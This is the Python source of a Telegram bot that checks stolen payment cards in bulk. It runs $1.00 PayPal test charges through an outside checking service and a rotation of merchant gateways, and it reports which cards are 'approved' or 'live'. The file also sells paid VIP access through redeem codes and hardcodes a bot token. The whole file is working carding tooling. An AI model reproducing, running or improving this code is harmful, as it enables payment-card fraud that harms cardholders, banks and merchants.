import os
import re
import time
import random
import string
import asyncio
import httpx
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

TOKEN = '7834120140:AAHL1Tn-FSgYnyuYeP3jQ-LhfRqMMDHNr9w'

# ------------------- System Configurations -------------------

ADMINS = [6843321125]  
VIP_USERS = {}         
BANNED_USERS = {}      
ALL_USERS = set()      
GATEWAYS = []          
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7
user_tasks = {}
CODES = {}

# Round Robin Counter
gateway_index = 0

# ------------------- Async Semaphores -------------------

api_semaphore = asyncio.Semaphore(6)

# ------------------- BIN Lookup Processor -------------------

async def get_bin_info(bin_number):
    urls = [
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for attempt in range(3):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                if r.status_code != 200:
                    continue
                data = r.json()
                brand = data.get("scheme") or data.get("brand") or data.get("type")
                card_type = data.get("type") or data.get("card_type")
                bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
                country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
                if not bank:
                    bank = data.get("issuer") or data.get("bank_name")
                if not country:
                    country = data.get("country_name")
                if brand or bank or country:
                    return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
            except:
                continue
            await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- Core API Engine -------------------

async def check_card_api(card_full, gateway_url):
    params = {"url": gateway_url, "card": card_full, "amount": 1.00}
    
    async with api_semaphore:
        try:
            async with httpx.AsyncClient(timeout=25) as client:
                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
                
                if r.status_code != 200:
                    return "declined", f"API Error HTTP {r.status_code}"
                
                data = r.json()
                result_raw = data.get('result', '')
                result = result_raw.lower()
                
                if "charge" in result or "success" in result:
                    return "approved", result_raw
                elif "insufficient" in result:
                    return "live", result_raw
                else:
                    return "declined", result_raw if result_raw else "Declined"
        except httpx.TimeoutException:
            return "declined", "API Timeout"
        except httpx.RequestError as e:
            return "declined", f"Network Error"
        except Exception as e:
            return "declined", f"System Fault: {str(e)[:40]}"

# ------------------- Card Format Generator -------------------

async def format_response(card_full, status, response, taken, gateway_url, user_id):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        status_text = "Approved / Charge 🔥💎"
    elif status == "live":
        status_text = "Live / Insufficient Funds 🟢✨"
    else:
        status_text = "Declined / Error ❌"
        
    gate_display = f"\n🔹 𝐆𝐚𝐭e𝐰𝐚𝐲: `{gateway_url}`" if user_id in ADMINS else ""

    return f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
          ⍟ [ 𝐏𝐀𝐘𝐏𝐀𝐋 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ] ⍟
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✨ 𝐏𝐚𝐲𝐏𝐚𝐥 𝐂𝐮𝐬𝐭𝐨𝐦 ($1.00) 

💳 𝐂𝐚𝐫𝐝: `{card_full}`
📝 𝐑e𝐬𝐩b𝐧𝐬e: `{response}`
⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}{gate_display}
⏱ 𝐓𝐚𝐤𝐞𝐧: `{taken}s`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ℹ️ 𝐈𝐧𝐟𝐨: `{info}`
🏛 𝐁𝐚𝐧𝐤: `{bank}`
🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: `{country}`
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"""

# ------------------- Guard Systems -------------------

async def check_banned_guard(update: Update) -> bool:
    user_id = update.effective_user.id
    if BANNED_USERS.get(user_id):
        await update.message.reply_text("⚠️ Access Denied: Account restricted from using this service.")
        return True
    return False

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS: return True
    if BANNED_USERS.get(user_id): return False
    if user_id in VIP_USERS and VIP_USERS[user_id] > time.time(): return True
    return mode == "single"

# ------------------- Command /cmds -------------------

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    
    commands_text = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬▬ [ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 ] ▬▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
👑 𝐀𝐃𝐌𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
• `/add [url]` - Add processing gateway route
• `/rmadd` - Pop last added gateway
• `/ban_user [id]` - Lock account out of bot
• `/unban_user [id]` - Restore access permissions
• `/prm [id] [days]` - Manually inject VIP membership
• `/rmprm [id]` - Clear account VIP status
• `/wafa [days] [max]` - Generate key token seeds
• `/show_users` - Fetch entire local user database
• `/try [id] [msg]` - Broadcast message to specific user
• `/SENT [msg]` - Broadcast message to all database users

⭐ 𝐕𝐈𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
• [Combo File Upload] - Trigger Mass Multi-Loop System Panel

👥 𝐅𝐑𝐄𝐄 𝐔𝐒𝐄Ｒ 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:
• `/start` - Launch active bot matrix
• `/cmds` - Access available command parameters
• `/pp [card]` - Single transactional entry gate
• `/stop` - Emergency halt file sequence
• `/code [wafa-key]` - Activate premium redeem vouchers
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    await update.message.reply_text(commands_text, parse_mode="Markdown")

# ------------------- Single Card Gate -------------------

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "single"):
        await update.message.reply_text("❌ Operational Error: Premium VIP permissions missing.")
        return
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        last = last_check_time.get(user_id, 0)
        if now - last < ANTI_SPAM_SECONDS:
            await update.message.reply_text(f"⏳ Dynamic throttling active: Wait {ANTI_SPAM_SECONDS} seconds.")
            return
        last_check_time[user_id] = now
    try:
        asyncio.create_task(process_pp(update, context))
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global gateway_index
    user_id = update.effective_user.id
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("💡 𝐔𝐬𝐚𝐠𝐞:\n`/pp 4242424242424242|09|28|123`", parse_mode="Markdown")
        return
    if not GATEWAYS:
        await update.message.reply_text("❌ System Failure: Operational gateways unallocated.")
        return
        
    # Pick one gateway using Round Robin
    gateway = GATEWAYS[gateway_index % len(GATEWAYS)]
    gateway_index += 1
    
    start_time = time.time()
    status, response = await check_card_api(card_full, gateway)
    taken = round(time.time() - start_time, 2)
    text = await format_response(card_full, status, response, taken, gateway, user_id)
    await update.message.reply_text(text, parse_mode="Markdown")

# ------------------- Emergency Interrupt -------------------

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("🛑 The examination was stopped.")

# ------------------- Mass File Intermediary -------------------

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "file"):
        await update.message.reply_text("❌ Execution Refused: File arrays require a Premium subscription tier.")
        return
    if user_id not in ADMINS:
        if user_id in user_tasks and not user_tasks[user_id].done():
            await update.message.reply_text("❌ Busy state detected: Your current queue has not cleared.")
            return
    try:
        task = asyncio.create_task(process_file(update, context))
        user_tasks[user_id] = task
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# ------------------- The Mass Panel Processing Loop -------------------

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global gateway_index
    user_id = update.effective_user.id
    stop_users[user_id] = False
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        approved = live = declined = 0
        panel_msg = await update.message.reply_text("Start Checking... 🔍")
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        for line in lines:
            if stop_users.get(user_id):
                await update.message.reply_text("🛑 The examination was stopped.")
                return
                
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match: continue
            card_full = match[0]
            
            if not GATEWAYS:
                await update.message.reply_text("❌ Engine Failure: Operational gateways empty.")
                return
                
            # Pick one gateway using Round Robin for this card
            gateway = GATEWAYS[gateway_index % len(GATEWAYS)]
            gateway_index += 1
            
            start_time = time.time()
            status, response = await check_card_api(card_full, gateway)
            await asyncio.sleep(random.uniform(0, 5))
            taken = round(time.time() - start_time, 2)
            text = await format_response(card_full, status, response, taken, gateway, user_id)
            
            if status == "approved":
                approved += 1
                await update.message.reply_text(text, parse_mode="Markdown")
            elif status == "live":
                live += 1
                await update.message.reply_text(text, parse_mode="Markdown")
            else:
                declined += 1
                
            last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
            gate_info = f"\n🌐 𝐆𝐚𝐭𝐞: `{gateway}`" if user_id in ADMINS else ""

            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬ [ 𝐌𝐀𝐒𝐒 𝐏𝐀𝐘𝐏𝐀𝐋 ] ▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✅ 𝐂𝐡𝐚𝐫𝐠𝐞: `{approved}` 💎
🟢 𝐋𝐢𝐯𝐞: `{live}` 🔋
❌ 𝐃e𝐜𝐥𝐢𝐧e𝐝: `{declined}`
📂 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐬: `{approved + live + declined}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 𝐋𝐚𝐬𝐭 𝐂𝐚𝐫𝐝: `{card_full}`
📝 𝐑e𝐬𝐩b𝐧𝐬e: `{response}`{gate_info}
ℹ️ 𝐈𝐧𝐟𝐨: `{last_info}`
🏛 𝐁𝐚𝐧𝐤: `{last_bank}`
🌍 𝐂b𝐮𝐧𝐭𝐫𝐲: `{last_country}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🛑 𝐒𝐭b𝐩: `{'ON' if stop_users.get(user_id) else 'OFF'}`"""
            try:
                await panel_msg.edit_text(panel, parse_mode="Markdown")
            except:
                pass

        await update.message.reply_text("✅ Success: Mass transaction loops executed completely.")

    except Exception as e:
        await update.message.reply_text(f"❌ Structural Fault: {e}")

# ------------------- Error Tracker -------------------

async def error_handler(update, context):
    print(f"Exception Logged: {context.error}")

# ------------------- Administration Subsystem -------------------

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    if update.effective_user.id not in ADMINS: return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=reply_text)
        await update.message.reply_text("✅ Dynamic message routed through proxy wrapper.")
    except:
        await update.message.reply_text("❌ Syntax: `/try USER_ID message`")

async def sent_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    if update.effective_user.id not in ADMINS: return
    if not context.args:
        return await update.message.reply_text("❌ Syntax: `/SENT Your announcement message here`")
    
    broadcast_msg = " ".join(context.args)
    count = 0
    for user_id in list(ALL_USERS):
        try:
            await context.bot.send_message(chat_id=user_id, text=f"📢 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐍𝐍𝐎𝐔𝐍𝐂𝐄𝐌𝐄𝐍𝐓:\n\n{broadcast_msg}")
            count += 1
            await asyncio.sleep(0.05)
        except:
            continue
    await update.message.reply_text(f"✅ Broadcast complete. Reached {count} users.")

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/code SEED-KEY")
    code = context.args[0].upper()
    if code not in CODES:
        return await update.message.reply_text("❌ Token signature invalid.")
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return await update.message.reply_text("❌ Registration failure: Max allocation cap hit.")
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(f"🎉 Subscriptions Configured! VIP level open for {code_data['duration']} days.")

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    if user_id not in ADMINS: return
    if len(context.args) < 2:
        return await update.message.reply_text("Usage:\n/wafa DAYS MAX_USERS")
    try:
        duration, max_users = int(context.args[0]), int(context.args[1])
    except: return
    code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
    await update.message.reply_text(f"🔑 𝐂b𝐝e 𝐆e𝐧e𝐫𝐚𝐭e𝐝:\n`{code}`", parse_mode="Markdown")

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    if update.effective_user.id not in ADMINS: return
    msg = "📊 𝐃𝐚𝐭𝐚𝐛𝐚𝐬e 𝐔𝐬e𝐫𝐬 𝐌𝐚𝐭𝐫𝐢𝐱:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        msg += f"• `{uid}` - *{status}*\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    if not context.args: return
    uid = int(context.args[0])
    BANNED_USERS[uid] = True
    VIP_USERS.pop(uid, None)
    await update.message.reply_text("User identifier moved to permanent ban pool. ✅")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    if not context.args: return
    uid = int(context.args[0])
    BANNED_USERS.pop(uid, None)
    await update.message.reply_text("Banned parameter dropped. User access normal. ✅")

async def add_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    if update.effective_user.id not in ADMINS: return
    if not context.args: return
    url = context.args[0]
    if url not in GATEWAYS:
        GATEWAYS.append(url)
        await update.message.reply_text(f"✅ Active endpoint routing successfully appended.")

async def remove_gateway(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    if update.effective_user.id not in ADMINS: return
    if GATEWAYS:
        gw = GATEWAYS.pop()
        await update.message.reply_text("🗑 Matrix modification complete: Endpoint gateway popped.")

async def add_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        VIP_USERS[target_id] = int(time.time()) + (days * 86400)
        await update.message.reply_text("VIP data structural flags applied. ✅")
    except: pass

async def remove_prm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS: return
    try:
        target_id = int(context.args[0])
        VIP_USERS.pop(target_id, None)
        await update.message.reply_text("Target VIP authorization dropped completely. ✅")
    except: pass

# ------------------- Initialization -------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_banned_guard(update): return
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    
    welcome_text = """┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
   🦅   𝐏𝐀𝐘𝐏𝐀𝐋   ⚡
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
  Welcome Operator! System is fully primed.

  • Type /cmds to load global command cluster.
  • Drop combo files directly to activate mass loops.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    await update.message.reply_text(welcome_text, parse_mode="Markdown")

# ------------------- Core App Runner -------------------

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmds", cmds))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("SENT", sent_broadcast))
    
    app.add_handler(CommandHandler("add", add_gateway))
    app.add_handler(CommandHandler("rmadd", remove_gateway))
    app.add_handler(CommandHandler("prm", add_prm))
    app.add_handler(CommandHandler("rmprm", remove_prm))
    
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
